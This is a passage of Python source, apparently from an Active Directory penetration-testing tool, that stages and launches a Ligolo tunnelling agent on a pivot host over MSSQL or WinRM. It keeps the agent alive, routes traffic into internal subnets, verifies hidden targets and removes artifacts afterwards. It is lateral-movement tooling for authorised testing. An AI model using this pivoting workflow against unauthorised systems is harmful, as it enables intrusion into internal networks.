            remote_agent_path=remote_agent_path,
            default=default_confirm,
        ):
            print_info("Skipping Ligolo tunnel creation by user choice.")
            return False
        artifact_transfer_method = "upload"
        if str(source_service or "").strip().lower() == "mssql":
            staging_bind_addr = _resolve_http_staging_bind_addr_with_recovery(
                pivot_host=pivot_host,
                excluded_bind_addrs=[str(proxy_state.get("listen_addr") or "").strip()],
            )
            if staging_bind_addr:
                staging_service = SingleFileHttpTransferService()
                try:
                    staged_file = staging_service.start(
                        local_path=str(agent_path),
                        bind_addr=staging_bind_addr,
                        advertised_host=connect_host,
                    )
                    preflight_payload = _run_ligolo_transport_preflight(
                        execute_remote_script=execute_remote_script,
                        domain=domain,
                        pivot_host=pivot_host,
                        username=username,
                        password=password,
                        connect_target=connect_target,
                        staging_file=staged_file,
                    )
                    proxy_check = preflight_payload.get("proxy") if isinstance(preflight_payload, dict) else {}
                    http_check = preflight_payload.get("http") if isinstance(preflight_payload, dict) else {}
                    proxy_reachable = bool(isinstance(proxy_check, dict) and proxy_check.get("reachable"))
                    http_reachable = bool(isinstance(http_check, dict) and http_check.get("reachable"))
                    if not proxy_reachable:
                        raise RuntimeError(
                            "The pivot host could not reach the Ligolo proxy preflight endpoint "
                            f"{connect_target}. Check your myip/connect target and local firewall rules."
                        )
                    if http_reachable and _download_remote_artifact_via_http(
                        execute_remote_script=execute_remote_script,
                        domain=domain,
                        pivot_host=pivot_host,
                        username=username,
                        password=password,
                        staging_file=staged_file,
                        remote_path=remote_agent_path,
                    ):
                        artifact_transfer_method = "http_download"
                    else:
                        if not http_reachable:
                            _http_host_text, _separator, _http_port_text = str(staged_file.bind_addr or "").rpartition(":")
                            print_warning(
                                f"The pivot host {mark_sensitive(pivot_host, 'hostname')} could not reach the local HTTP staging endpoint "
                                f"{mark_sensitive(staged_file.advertised_host, 'hostname')}:{_http_port_text}. "
                                "ADscan will fall back to the legacy artifact upload path."
                            )
                        print_info(
                            "Falling back to direct Ligolo artifact upload. "
                            "This can be significantly slower over MSSQL."
                        )
                        if not upload_agent(
                            domain=domain,
                            host=pivot_host,
                            username=username,
                            password=password,
                            local_path=str(agent_path),
                            remote_path=remote_agent_path,
                        ):
                            raise RuntimeError(
                                f"Failed to upload the Ligolo agent to {remote_agent_path}."
                            )
                finally:
                    staging_service.stop()
            else:
                print_info(
                    "HTTP staging was skipped by operator choice. "
                    "Falling back to direct Ligolo artifact upload."
                )
                if not upload_agent(
                    domain=domain,
                    host=pivot_host,
                    username=username,
                    password=password,
                    local_path=str(agent_path),
                    remote_path=remote_agent_path,
                ):
                    raise RuntimeError(
                        f"Failed to upload the Ligolo agent to {remote_agent_path}."
                    )
        else:
            if not upload_agent(
                domain=domain,
                host=pivot_host,
                username=username,
                password=password,
                local_path=str(agent_path),
                remote_path=remote_agent_path,
            ):
                raise RuntimeError(
                    f"Failed to upload the Ligolo agent to {remote_agent_path}."
                )

        known_session_ids = {
            str(agent.get("session_id") or "").strip()
            for agent in service.list_agents()
            if str(agent.get("session_id") or "").strip()
        }
        keepalive_thread: threading.Thread | None = None
        keepalive_errors: list[Exception] = []
        launch_payload: dict[str, Any] = {}
        uses_keepalive_session = str(source_service or "").strip().lower() == "winrm"

        if uses_keepalive_session:
            # WinRM needs a keepalive session because child processes inherit the
            # WinRM Job Object and are killed once the non-interactive session exits.
            result_token = secrets.token_hex(8)
            result_path = rf"C:\Windows\Temp\adscan_l{result_token}.json"
            keepalive_script = build_ligolo_agent_keepalive_script(
                remote_agent_path=remote_agent_path,
                connect_target=connect_target,
                fingerprint=fingerprint,
                result_path=result_path,
            )

            def _run_keepalive() -> None:
                try:
                    execute_remote_script(
                        domain=domain,
                        host=pivot_host,
                        username=username,
                        password=password,
                        script=keepalive_script,
                        operation_name="ligolo_agent_keepalive",
                    )
                except Exception as exc:  # noqa: BLE001
                    keepalive_errors.append(exc)

            print_info_verbose("Launching Ligolo agent on target via keepalive WinRM session…")
            keepalive_thread = threading.Thread(
                target=_run_keepalive, daemon=True, name="ligolo-keepalive"
            )
            keepalive_thread.start()

            result_reader = _build_result_reader_script(result_path)
            poll_deadline = time.time() + 40.0
            while time.time() < poll_deadline:
                time.sleep(2.0)
                if keepalive_errors:
                    raise RuntimeError(
                        f"Ligolo agent keepalive failed before writing result: {keepalive_errors[0]}"
                    )
                try:
                    read_stdout = execute_remote_script(
                        domain=domain,
                        host=pivot_host,
                        username=username,
                        password=password,
                        script=result_reader,
                        operation_name="ligolo_agent_result_read",
                    )
                    raw = (read_stdout or "{}").strip()
                    if raw and raw not in ("{}", ""):
                        launch_payload = json.loads(raw)
                        break
                except Exception:  # noqa: BLE001
                    continue

            if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
                raise RuntimeError(
                    "Ligolo agent keepalive script did not return a successful result within 40s."
                )
        else:
            start_script = build_ligolo_agent_start_script(
                remote_agent_path=remote_agent_path,
                connect_target=connect_target,
                fingerprint=fingerprint,
            )
            print_info_verbose(
                f"Launching Ligolo agent on target via {mark_sensitive(source_service.upper(), 'detail')} command execution…"
            )
            launch_stdout = execute_remote_script(
                domain=domain,
                host=pivot_host,
                username=username,
                password=password,
                script=start_script,
                operation_name="ligolo_agent_start",
            )
            raw_launch = str(launch_stdout or "").strip()
            print_info_debug(
                f"[pivot] ligolo_agent_start raw stdout ({len(raw_launch)} chars): "
                f"{raw_launch[:500]!r}"
            )
            try:
                launch_payload = _load_remote_json_stdout(
                    raw_launch,
                    mssql_compatible=str(source_service or "").strip().lower() == "mssql",
                )
            except json.JSONDecodeError as _jde:
                raise RuntimeError(
                    f"Ligolo agent start script via {source_service.upper()} returned "
                    f"non-JSON output (JSON error: {_jde}). "
                    f"Raw output: {raw_launch[:300]!r}"
                ) from _jde
            if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
                raise RuntimeError(
                    f"Ligolo agent start script via {source_service.upper()} did not report a successful launch. "
                    f"Payload: {launch_payload!r}"
                )

        _wmi_err = launch_payload.get("wmi_error")
        _schtask_err = launch_payload.get("schtask_error")
        print_info_debug(
            f"[pivot] Agent launch result — method={launch_payload.get('launch_method', 'unknown')} "
            f"pid={launch_payload.get('pid')} "
            f"process_alive={launch_payload.get('process_alive')} "
            f"probe_reachable={launch_payload.get('probe_reachable')}"
            + (f" | wmi_error={_wmi_err!r}" if _wmi_err else "")
            + (f" | schtask_error={_schtask_err!r}" if _schtask_err else "")
        )

        # Quick liveness check: if the process already died 2 seconds after launch,
        # it was most likely killed by AV/EDR before making any network connection.
        if launch_payload.get("process_alive") is False:
            exit_code = launch_payload.get("exit_code")
            raise RuntimeError(
                f"Ligolo agent process exited immediately after launch "
                f"(exit_code={exit_code}). "
                f"The binary was likely quarantined by antivirus/EDR on the target host."
            )
        if isinstance(launch_payload.get("pid"), int):
            remote_agent_pid = int(launch_payload.get("pid"))
        if uses_keepalive_session:
            print_info_verbose(
                f"Agent process alive on target (PID {launch_payload.get('pid')}). "
                f"Keepalive WinRM session is holding the Job Object open. "
                f"Waiting for proxy connection…"
            )
        else:
            print_info_verbose(
                f"Agent process alive on target (PID {launch_payload.get('pid')}). "
                f"Waiting for proxy connection over {mark_sensitive(source_service.upper(), 'detail')}…"
            )

        # Agent is launched with -retry -retry-delay 5 -reconnect-timeout 60.
        # Wait slightly beyond that window so ADscan doesn't time out before
        # the agent exhausts its own retries.
        agent = service.wait_for_new_agent(known_session_ids=known_session_ids, timeout_seconds=70.0)
        routes = [item.prefix_hint for item in subnet_summaries if item.prefix_hint]
        interface_name = _build_ligolo_interface_name(
            domain=domain, pivot_host=pivot_host
        )
        print_info_verbose(
            f"Configuring tunnel interface {interface_name!r} with {len(routes)} route(s): {', '.join(routes)}"
        )
        service.ensure_interface(interface_name)
        added_routes = service.ensure_routes(interface_name=interface_name, routes=routes)
        service.ensure_tunnel_started(
            agent_id=int(agent["id"]), interface_name=interface_name
        )

        verification_results = probe_ligolo_routed_targets(confirmed_targets)
        verified_targets = [
            entry for entry in verification_results if entry.get("observed_ports")
        ]
        tunnel_record = {
            "created_at": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "pivot_host": pivot_host,
            "pivot_username": username,
            "source_service": str(source_service or "winrm").strip().lower() or "winrm",
            "pivot_method": str(pivot_method or "ligolo_winrm_pivot").strip()
            or "ligolo_winrm_pivot",
            "pivot_tool": "Ligolo",
            "proxy_listen_addr": proxy_state.get("listen_addr"),
            "proxy_api_laddr": proxy_state.get("api_laddr"),
            "connect_target": connect_target,
            "fingerprint": fingerprint,
            "remote_agent_path": remote_agent_path,
            "remote_artifact_transfer_method": artifact_transfer_method,
            "remote_agent_pid": launch_payload.get("pid"),
            "agent": agent,
            "interface_name": interface_name,
            "routes": routes,
            "new_routes": added_routes,
            "confirmed_targets": confirmed_targets,
            "verification": verification_results,
        }
        stored_tunnel_record = service.append_tunnel_state(tunnel_record) or tunnel_record
        persisted_tunnel_id = str(stored_tunnel_record.get("tunnel_id") or "").strip() or None

        if uses_keepalive_session and keepalive_thread is not None:
            _monitor_iface = interface_name
            _monitor_host = pivot_host
            _monitor_agent_path = remote_agent_path
            _monitor_agent_pid = remote_agent_pid
            _monitor_tunnel_id = persisted_tunnel_id

            def _monitor_keepalive() -> None:
                keepalive_thread.join()
                if _keepalive_exit_was_operator_requested(
                    service,
                    tunnel_id=_monitor_tunnel_id,
                ):
                    print_info_debug(
                        f"[ligolo-cleanup] keepalive exit for {_monitor_host} suppressed because shutdown was requested."
                    )
                    return
                if keepalive_errors:
                    print_warning(
                        f"Ligolo keepalive WinRM session for "
                        f"{mark_sensitive(_monitor_host, 'hostname')} ended with an error — "
                        f"the agent process was likely killed and the tunnel on "
                        f"{mark_sensitive(_monitor_iface, 'text')} may be down.",
                        items=[rich_escape(str(keepalive_errors[0]))],
                        panel=True,
                        spacing="before",
                    )
                else:
                    print_warning(
                        f"Ligolo keepalive WinRM session for "
                        f"{mark_sensitive(_monitor_host, 'hostname')} ended — "
                        f"the agent process exited or the 1-hour safety timeout was reached. "
                        f"Tunnel on {mark_sensitive(_monitor_iface, 'text')} may be down.",
                        spacing="before",
                    )
                try:
                    cleanup_result = cleanup_remote_ligolo_artifact(
                        domain=domain,
                        pivot_host=_monitor_host,
                        username=username,
                        password=password,
                        remote_agent_path=_monitor_agent_path,
                        remote_agent_pid=_monitor_agent_pid,
                        execute_remote_script=execute_remote_script,
                        tunnel_id=_monitor_tunnel_id,
                        reason="keepalive_exit",
                    )
                    if cleanup_result.cleanup_succeeded:
                        _persist_artifact_cleanup_update(
                            {
                                "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
                                "remote_artifact_cleanup_reason": "keepalive_exit",
                                "remote_artifact_cleanup_status": "deleted",
                                "remote_artifact_cleanup_message": cleanup_result.message,
                                "remote_artifact_deleted": cleanup_result.file_deleted,
                            }
                        )
                    else:
                        _persist_artifact_cleanup_update(
                            {
                                "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
                                "remote_artifact_cleanup_reason": "keepalive_exit",
                                "remote_artifact_cleanup_status": "operator_action_required",
                                "remote_artifact_cleanup_message": cleanup_result.message,
                                "remote_artifact_deleted": cleanup_result.file_deleted,
                            }
                        )
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_info_debug(f"[ligolo-cleanup] keepalive cleanup failed: {exc}")
                try:
                    reconciliation = reconcile_domain_pivot_runtime_state(
                        shell,
                        workspace_dir=workspace_dir,
                        domain=domain,
                    )
                    if reconciliation and reconciliation.restored_direct_vantage:
                        from adscan_internal.services.pivot_relaunch_service import (
                            maybe_offer_previous_pivot_relaunch,
                        )

                        maybe_offer_previous_pivot_relaunch(
                            shell,
                            domain=domain,
                            interactive=False,
                            trigger="keepalive_drop",
                        )
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_info_debug(
                        "[pivot-runtime] failed to reconcile stale pivot after keepalive drop: "
                        f"{mark_sensitive(str(exc), 'detail')}"
                    )

            threading.Thread(
                target=_monitor_keepalive, daemon=True, name="ligolo-keepalive-monitor"
            ).start()
            print_info_verbose(
                f"Keepalive monitor active — you will be notified if the WinRM session "
                f"for {mark_sensitive(pivot_host, 'hostname')} drops."
            )

        print_success(
            f"Ligolo tunnel created through {mark_sensitive(pivot_host, 'hostname')} on "
            f"{mark_sensitive(interface_name, 'text')} for {len(routes)} route(s)."
        )
        print_info(
            "Exit ADscan cleanly when you are done with this pivot so the staged Ligolo agent can be removed from the target."
        )
        if getattr(shell, "console", None):
            verification_table = Table(title="Ligolo Route Verification", box=None)
            verification_table.add_column("IP")
            verification_table.add_column("Hostname(s)")
            verification_table.add_column("Observed Ports")
            verification_table.add_column("Expected Ports")
            for entry in verification_results[:10]:
                verification_table.add_row(
                    mark_sensitive(str(entry.get("ip") or ""), "ip"),
                    ", ".join(
                        mark_sensitive(host, "hostname")
                        for host in entry.get("hostname_candidates", [])
                    )
                    or "-",
                    ", ".join(str(port) for port in entry.get("observed_ports", []))
                    or "-",
                    ", ".join(str(port) for port in entry.get("expected_ports", []))
                    or "-",
                )
            shell.console.print(verification_table)
        if verified_targets:
            print_success(
                f"Post-tunnel verification succeeded for {len(verified_targets)} hidden target(s) from the current vantage."
            )
        else:
            print_warning(
                "Ligolo tunnel started, but the immediate local verification did not observe any expected ports yet."
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        if remote_agent_path:
            print_info("Attempting to remove the staged Ligolo agent from the pivot host…")
            cleanup_result = cleanup_remote_ligolo_artifact(
                domain=domain,
                pivot_host=pivot_host,
                username=username,
                password=password,
                remote_agent_path=remote_agent_path,
                remote_agent_pid=remote_agent_pid,
                execute_remote_script=execute_remote_script,
                tunnel_id=persisted_tunnel_id,
                reason="tunnel_creation_failed",
            )
            _persist_artifact_cleanup_update(
                {
                    "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
                    "remote_artifact_cleanup_reason": "tunnel_creation_failed",
                    "remote_artifact_cleanup_status": (
                        "deleted" if cleanup_result.cleanup_succeeded else "operator_action_required"
                    ),
                    "remote_artifact_cleanup_message": cleanup_result.message,
                    "remote_artifact_deleted": cleanup_result.file_deleted,
                }
            )
            if cleanup_result.cleanup_succeeded:
                print_info(
                    f"Removed the staged Ligolo agent from {mark_sensitive(pivot_host, 'hostname')} "
                    f"after the failed tunnel attempt."
                )
            else:
                print_warning(
                    f"ADscan could not confirm cleanup of the staged Ligolo agent on "
                    f"{mark_sensitive(pivot_host, 'hostname')}.",
                    items=[
                        f"Verify manually: {mark_sensitive(remote_agent_path, 'path')}",
                        cleanup_result.message,
                    ],
                    panel=True,
                )
        print_warning(
            f"Ligolo pivot tunnel creation failed for {mark_sensitive(pivot_host, 'hostname')}: {rich_escape(str(exc))}"
        )
        if "No default ligolo egress port is available" in str(exc):
            print_instruction("Inspect listeners with: ss -ltnp '( sport = :443 or sport = :80 )'")
            print_instruction(
                "After freeing one default port, retry the tunnel workflow. "
                "If you must use another port, start the proxy explicitly with: ligolo proxy start 0.0.0.0:<port>"
            )
        return False


__all__ = [
    "PivotReachableSubnetSummary",
    "build_ligolo_agent_keepalive_script",
    "build_ligolo_agent_start_script",
    "orchestrate_ligolo_pivot_tunnel",
    "probe_ligolo_routed_targets",
    "summarize_confirmed_pivot_subnets",
]
